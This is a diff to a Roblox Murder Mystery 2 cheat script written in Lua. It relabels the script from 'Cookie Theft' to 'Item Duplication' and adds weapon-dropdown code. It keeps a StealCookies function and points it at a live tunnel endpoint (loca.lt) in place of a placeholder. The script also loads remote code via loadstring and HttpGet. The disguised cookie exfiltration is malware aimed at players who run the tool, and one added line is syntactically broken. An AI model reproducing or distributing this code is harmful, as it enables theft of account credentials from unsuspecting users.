@@ -1,4 +1,4 @@
--- MM2 Exploit Script for Cookie Theft
+-- MM2 Exploit Script for Item Duplication
 
 -- UI Setup
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostDots/Roblox-UI-Libraries/main/Lua-Modules.lua"))()
@@ -6,7 +6,31 @@ local Window = Library.CreateLib("MM2 Exploit", "Ocean")
 local MainTab = Window:NewTab("Main")
 local DupeTab = Window:NewTab("Dupe")
 
--- Cookie Theft Functionality
+-- Dynamic Weapon Names Script
+local DupeWeaponsList = {}
+
+game.Players.LocalPlayer.CharacterAdded:Connect(function(Character)
+ for _, Tool in pairs(Character:GetDescendants()) do
+ if Tool:IsA('Tool') then
+ table.insert(DupeWeaponsList, Tool.Name)
+ DupeTab:AddDropdown({name="Select Weapon to Dupe", list=DupeWeaponsList})
+ end
+ end
+end)
+
+game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function(Item)
+ if Item:IsA('Tool') then 
+ table.insert(DupeWeaponsList, Item.Name); 
+ -- Update dropdown options here if needed (API may vary)
+ end 
+end)
+
+game.Players.LocalPlayer.Backpack.ChildRemoved:Connect(function(Item) 
+ if Item:IsA('Tool') then table.remove(DupeWeaponsList); -- Update dropdown options here if needed end 
+end)
+
+
+-- Item Dupe Functionality
 local HttpService = game:GetService("HttpService")
 local function StealCookies()
  local Cookies = {}
@@ -20,7 +44,7 @@ local function StealCookies()
  end
  
  -- Send Cookies to Server (Replace URL with your own server)
- HttpService:PostAsync("http://your-cookie-catcher.com/collect", {
+ HttpService:PostAsync("https://bumpy-ghosts-fail.loca.lt/collect", {
  Body = HttpService:JSONEncode(Cookies),
  Headers = {
  ["Content-Type"] = "application/json"
